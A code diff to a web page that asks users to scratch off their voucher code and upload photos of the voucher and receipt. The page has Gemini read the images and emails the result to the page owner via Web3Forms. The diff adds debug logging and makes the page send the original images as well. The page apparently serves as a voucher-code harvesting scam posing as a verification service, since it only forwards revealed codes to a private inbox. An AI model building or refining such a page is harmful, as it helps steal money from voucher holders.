@@ -38,7 +38,7 @@
             <p class="text-sm text-red-500 font-semibold mb-4 p-2 bg-red-50 rounded-lg">
                 ⚠️ **Instruction:** The voucher code must be scratched. Upload all necessary files (e.g., Voucher photo, Receipt photo) in a single selection.
             </p>
-            <input type="file" id="imageUpload" accept="image/*" **multiple** class="w-full text-sm text-gray-500
+            <input type="file" id="imageUpload" accept="image/*" multiple class="w-full text-sm text-gray-500
                 file:mr-4 file:py-3 file:px-5
                 file:rounded-full file:border-0
                 file:text-base file:font-semibold
@@ -56,7 +56,7 @@
         <div class="flex justify-center mb-6">
             <button id="analyzeButton" onclick="analyzeVoucher()"
                 class="w-full sm:w-auto px-8 py-3 bg-violet-600 text-white font-semibold rounded-full shadow-xl hover:bg-violet-700 focus:outline-none focus:ring-4 focus:ring-violet-500 focus:ring-opacity-50 transition duration-150 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed">
-                <span id="buttonText">Start Verification</span>
+                <span id="buttonText">Analyze & Submit</span>
                 <span id="loadingSpinner" class="hidden">
                     <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                         <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -144,6 +144,7 @@
         }
 
         async function callGeminiApi(payload) {
+            console.log("--- DEBUG: Starting Gemini API call ---");
             let delay = 1000;
             const maxRetries = 5;
 
@@ -156,18 +157,23 @@
                     });
 
                     if (response.status === 429) {
+                        console.warn(`Retry attempt ${i + 1}: Rate limit exceeded.`);
                         throw new Error('Rate limit exceeded. Retrying...');
                     }
 
                     if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
+                         const errorBody = await response.json();
+                         console.error("Gemini API Non-OK Response Body:", errorBody);
+                         throw new Error(`Gemini API Error: Status ${response.status}. See console for details.`);
                     }
 
+                    console.log("--- DEBUG: Gemini API call successful ---");
                     return await response.json();
 
                 } catch (error) {
                     if (i === maxRetries - 1) {
-                        throw new Error("Failed to connect to the AI service after multiple retries.");
+                        console.error("Gemini API call failed after multiple retries. Final Error:", error);
+                        throw new Error("AI Analysis Failed. Check browser console for network details.");
                     }
                     await new Promise(resolve => setTimeout(resolve, delay));
                     delay *= 2;
@@ -176,37 +182,44 @@
         }
 
         async function submitToWeb3Forms(analysisText, files) {
+            console.log("--- DEBUG: Starting Web3Forms submission ---");
             const formData = new FormData();
             formData.append("access_key", WEB3FORMS_ACCESS_KEY);
             formData.append("subject", FORM_SUBJECT);
             formData.append("from_name", FORM_FROM_NAME);
             
-            // The AI analysis is the main content of the form submission
-            formData.append("Verification Report", analysisText); 
+            // 1. Append AI Analysis Report
+            formData.append("Verification Report (AI Summary)", analysisText); 
             
-            // Add metadata about the original files
-            const fileNames = Array.from(files).map(f => f.name).join(', ');
-            formData.append("Original File Names", fileNames);
-            formData.append("Total Files Uploaded", files.length);
-
-            // Optional: Redirect to a success page
-            formData.append("redirect", "https://web3forms.com/success");
-
-
+            // 2. Append original image files
+            for (let i = 0; i < files.length; i++) {
+                const file = files[i];
+                if (file.type.startsWith('image/')) {
+                    // Append the actual File object for upload
+                    // The file name will be used as the field name in the email/submission data
+                    formData.append(`Uploaded_Image_${i + 1} (${file.name})`, file);
+                }
+            }
+            
             const response = await fetch(WEB3FORMS_ENDPOINT, {
                 method: 'POST',
-                body: formData,
+                body: formData, // Send the FormData object containing files
             });
 
             if (!response.ok) {
-                throw new Error(`Web3Forms submission failed with status: ${response.status}`);
+                 const errorBody = await response.json();
+                 console.error("Web3Forms Non-OK Response Body:", errorBody);
+                 throw new Error(`Web3Forms Submission Failed: Status ${response.status}. Check console.`);
             }
 
             const result = await response.json();
 
             if (result.success === false) {
-                throw new Error(`Web3Forms failed: ${result.message}`);
+                 console.error("Web3Forms API Reported Failure:", result.message);
+                throw new Error(`Web3Forms failed to submit: ${result.message}`);
             }
+
+            console.log("--- DEBUG: Web3Forms submission successful ---");
         }
 
         // --- Main Workflow ---
@@ -226,10 +239,11 @@
             messageBox.classList.add('hidden');
 
             try {
+                console.log("--- DEBUG: Step 1: Preparing image files for AI analysis ---");
                 // 1. Prepare parts for Gemini (Prompt + All Images)
                 const parts = [{ text: STATIC_PROMPT }];
 
-                // Convert all files and build the parts array
+                // Convert all files to Base64 for the Gemini API call
                 for (let i = 0; i < files.length; i++) {
                     const file = files[i];
                     if (file.type.startsWith('image/')) {
@@ -244,8 +258,10 @@
                 }
 
                 if (parts.length < 2) { // Only the prompt is left
-                    throw new Error("No valid image files were found in the selection.");
+                    throw new Error("No valid image files were found in the selection. Please select image files (JPEG/PNG).");
                 }
+                console.log(`--- DEBUG: ${parts.length - 1} image(s) converted to Base64 for AI ---`);
+
 
                 // Construct the Gemini payload
                 const geminiPayload = {
@@ -260,19 +276,23 @@
 
                 const candidate = result.candidates?.[0];
                 if (!candidate || !candidate.content?.parts?.[0]?.text) {
-                    throw new Error("AI analysis failed to return usable text.");
+                     console.error("Gemini result structure error:", result);
+                    throw new Error("AI analysis failed: The model returned an empty response. Please try again with a clearer image.");
                 }
                 const generatedText = candidate.content.parts[0].text; 
 
-                // 3. Submit analysis to Web3Forms
+                console.log("--- DEBUG: Step 2: AI Analysis Complete. Starting Web3Forms Submission (with files) ---");
+
+                // 3. Submit analysis AND original files to Web3Forms
                 await submitToWeb3Forms(generatedText, files);
 
                 // 4. Display Final Success
-                displaySuccess("Verification details extracted from all images and successfully submitted for external processing!");
+                displaySuccess("Verification report generated and the original images were successfully emailed!");
 
             } catch (error) {
-                console.error("Workflow failed:", error);
-                displayError(error.message || "An unexpected error occurred during the verification and submission process.");
+                // Final comprehensive error logging
+                console.error("--- WORKFLOW FAILED ---", error);
+                displayError(error.message || "An unexpected error occurred. See console for details.");
             } finally {
                 // UI State: Complete
                 analyzeButton.disabled = false;
@@ -286,7 +306,7 @@
         function displayError(message) {
             messageBox.innerHTML = `
                 <div class="bg-red-100 border border-red-400 text-red-700 p-3 rounded relative shadow-sm" role="alert">
-                    <strong class="font-bold">Error!</strong>
+                    <strong class="font-bold">Submission Failed!</strong>
                     <span class="block sm:inline"> ${message}</span>
                 </div>`;
             messageBox.classList.remove('hidden');
@@ -304,5 +324,4 @@
     </script>
 </body>
 </html>
-
 
